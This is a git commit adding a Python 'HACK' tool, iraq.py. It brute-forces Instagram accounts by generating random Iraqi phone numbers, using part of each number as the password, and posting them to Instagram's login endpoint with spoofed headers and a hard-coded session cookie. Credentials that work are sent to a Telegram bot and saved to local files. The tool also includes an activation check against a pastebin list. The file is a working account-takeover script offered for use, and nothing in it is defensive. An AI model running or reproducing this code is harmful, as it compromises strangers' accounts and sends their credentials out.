912f3ae5888ca008215ba9ca1487ce15ccb9071c
StyleGame <69700134+StyleGame@users.noreply.github.com>
2021-07-06 19:28:00 +0200

    Create iraq.py

---
+++ iraq.py
@@ -0,0 +1,214 @@
+import requests
+import requests
+import sys,os
+os.system("clear")
+B ='\033[1;92m'
+re = requests.get("https://pastebin.com/raw/TJMsH2xz")
+# HACK
+p = input(B+"[✓] code your member :")
+if p == "" :
+  sys.exit()
+if p in str(re.text):
+  print("you Are Active The Sidraelezz")
+else:
+  print(B+"الرجاء أخذ مفتاح التفعيل من المطور @SS_SS_1")
+  sys.exit()
+os.system("clear")
+import random,os,sys
+import requests
+import time
+from time import sleep
+from user_agent import generate_user_agent
+#---------------{الوان}-------------#
+A = "\033[1;91m"
+B = "\033[1;90m"
+C = "\033[1;97m"
+E = "\033[1;92m"
+H = "\033[1;93m"
+K = "\033[1;94m"
+L = "\033[1;95m"
+r = requests.session()
+Sidra ="""
+\033[1;96m ------------------------
+ \033[1;32m < COD BY SIDRA ELEZZ >
+ \033[1;96m ------------------------
+\033[1;91m ____  _     _
+\033[1;92m/ ___|(_) __| |_ __ __ _
+\033[1;91m\___ \| |/ _` | '__/ _` |
+\033[1;92m ___) | | (_| | | | (_| |
+\033[1;91m|____/|_|\__,_|_|  \__,_|
+           \033[1;93m _____ _     _____
+           \033[1;92m| ____| |   | ____|________
+           \033[1;91m|  _| | |   |  _| |_  /_  /
+           \033[1;92m| |___| |___| |___ / / / /
+           \033[1;91m|_____|_____|_____/___/___|\033[1;92m
+           
+         
+\033[1;97m--------------------------------------------------
+\033[1;95m
+ AUTHOR     : SIDRA ELEZZ
+ Telegram   : TERMUX TOOLS
+ YOUTUBE    : TERMUX TOOLS
+ GITHUB     : GITHUB.COM/SIDRA ELEZZ
+\033[1;32m
+--------------------------------------------------
+"""
+logo= """
+\033[1;96m ------------------------
+ \033[1;32m < COD BY SIDRA ELEZZ >
+ \033[1;96m ------------------------
+          \033[1;91m _
+          \033[1;92m(_)_ __ __ _  __ _
+          \033[1;91m| | '__/ _` |/ _` |
+          \033[1;92m| | | | (_| | (_| |
+          \033[1;91m|_|_|  \__,_|\__, |\033[1;95m@TT.RQ\033[1;92m
+          \033[1;92m                |_|
+
+    H \033[1;91mA \033[1;92mC  \033[1;91mK   \033[1;92mI \033[1;91mN \033[1;92mS \033[1;91mT \033[1;92mA 
+\033[1;97m--------------------------------------------------
+\033[1;95m
+ AUTHOR     : SIDRA ELEZZ
+ Telegram   : TERMUX TOOLS
+ YOUTUBE    : TERMUX TOOLS
+ GITHUB     : GITHUB.COM/SIDRA ELEZZ
+\033[1;32m
+--------------------------------------------------
+"""
+Sidra1= """
+\033[1;96m ------------------------
+ \033[1;32m < COD BY SIDRA ELEZZ >
+ \033[1;96m ------------------------
+          \033[1;91m _
+          \033[1;92m(_)_ __ __ _  __ _
+          \033[1;91m| | '__/ _` |/ _` |
+          \033[1;92m| | | | (_| | (_| |
+          \033[1;91m|_|_|  \__,_|\__, |\033[1;95m@TT.RQ\033[1;92m
+          \033[1;92m                |_|
+
+    H \033[1;91mA \033[1;92mC  \033[1;91mK   \033[1;92mI \033[1;91mN \033[1;92mS \033[1;91mT \033[1;92mA 
+"""
+
+def wa():
+    os.system('xdg-open https://t.me/TT_RQ/1')
+
+
+def restart():
+    ngulang = sys.executable
+    os.execl(ngulang, ngulang, *sys.argv)
+os.system('clear')
+print(Sidra)
+user = input('          \033[1;94mTOOL USERNAME: ')
+sandi = input('          \033[1;93mTOOL PASSWORD: ')
+if sandi == 'HACK' and user == 'HACK':
+    print( 'Anda Telah Login')
+    sys.exit
+else:
+    print(E+ " FIRST STEP Is Done. Logged in Successfully as "+H+ sandi)
+    wa()
+    restart()
+os.system('clear')
+print(logo)
+token = input(E+"{"+A+"+"+E+"}"+H+ "Enter ENTER THE TOKN BOT :\n"+C)
+ID = input(E+"{"+A+"+"+E+"}"+H+ "Enter ENTER THE ID YOUR :\n"+C)
+start_msg = r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=START HACK...🔥").json()#Tofe_x
+id_msg	=(start_msg['result']["message_id"])
+os.system('clear')
+os.system('xdg-open https://t.me/TT_RQ/1')
+def ketik(s):
+	for ASU in s + '\n':
+		sys.stdout.write(ASU)
+		sys.stdout.flush()
+		sleep(50. / 700)
+def error():
+	while True:
+		print('')		
+		print('خطا في لمعلومات')
+		print('error !! ')
+		
+os.system('clear')
+ketik(Sidra1)
+print (E+"{"+A+"1"+E+"}"+H+ "START CHECKER ")
+print (E+"{"+A+"0"+E+"}"+A+ "EXIT ")
+print (A)
+sidra = input(E+"{"+A+"?"+E+"}"+C+ "CHOOSE AN OPTION : "+C)
+USER_1 = "1234567890"
+if sidra == '1':
+	print('\033[1;95m--------------------------------------------------\033[1;92m') 
+	Ok = 0
+	Cp = 0
+	Do = 0
+	Eo = 0
+	while True:
+		USER_2 = str(''.join((random.choice(USER_1) for i in range(8))))
+		emi = "+96477"+USER_2
+		pw = "077"+USER_2
+		PASS2 = "Bangladesh"
+		PASS3 = "786786"
+		Url="https://www.instagram.com/accounts/login/ajax/"
+		
+		payload = {
+		                'username':emi,
+                        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(pw),
+                        'queryParams': '{}',
+                        'optIntoOneTap': 'false',}
+
+		headers = {
+
+     'accept':'*/*',
+
+    'accept-encoding':'gzip,deflate,br',
+
+    'accept-language':'en-US,en;q=0.9,ar;q=0.8',
+
+    'content-length':'269',
+
+    'content-type':'application/x-www-form-urlencoded',
+
+    'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
+
+    'origin':'https://www.instagram.com',
+
+    'referer':'https://www.instagram.com/',
+
+    'sec-fetch-dest':'empty',
+
+    'sec-fetch-mode':'cors',
+
+    'sec-fetch-site':'same-origin',
+
+    'user-agent': generate_user_agent(),
+
+    'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
+
+    'x-ig-app-id':'936619743392459',
+
+    'x-ig-www-claim':'0',
+
+    'x-instagram-ajax':'8a8118fa7d40',
+
+    'x-requested-with':'XMLHttpRequest',
+
+                }
+		req = r.post(Url,headers=headers,data=payload)
+		if ("userId") in req.text:
+			Ok+=1
+			Do+=1
+			r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome Sidra ELEzz 👩‍💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Do}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. STERT HACK 🔥: {Ok}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {emi} ← ]\n\n.✥. PASS 🔐 : [ → {pw} ← ]\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
+			r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=✰︎ Hi Sidra Successful ✓ ⁦✰︎\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : {emi} \n\n.✥. PASS 🔐 : {pw} \n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
+			with open("OK.txt",'a') as ff:
+				ff.write(f"USERNAME : {emi}\nPASSPWRD : {pw}\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1\n\n\n")
+		elif ("checkpoint_url")  in req.text:
+			Ok+=1
+			Cp+=1
+			r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome Sidra ELEzz 👩‍💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Do}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. STERT HACK 🔥: {Ok}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {emi} ← ]\n\n.✥. PASS 🔐 : [ → {pw} ← ]\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
+			r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=✰︎ Hi Sidra Checkpoint 🔐⁦✰︎\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : {emi} \n\n.✥. PASS 🔐 : {pw} \n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
+			
+			with open("CP.txt",'a') as ff:
+				ff.write(f"USERNAME : {emi}\nPASSPWRD : {pw}\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1\n\n\n")
+		else:
+			Ok+=1
+			Eo+=1
+			r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=✰︎ Welcome Sidra ELEzz 👩‍💻  ⁦✰︎\n-----------------------------------------\n.✥. Successful 💯 : {Do}\n\n.✥. Checkpoint 🔐 : {Cp}\n\n-----------------------------------------\n.✥. STERT HACK 🔥: {Ok}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 : [ → {emi} ← ]\n\n.✥. PASS 🔐 : [ → {pw} ← ]\n-----------------------------------------\n.✥.CH : @TT_RQ Tele: @SS_SS_1")
+			
+			
+	
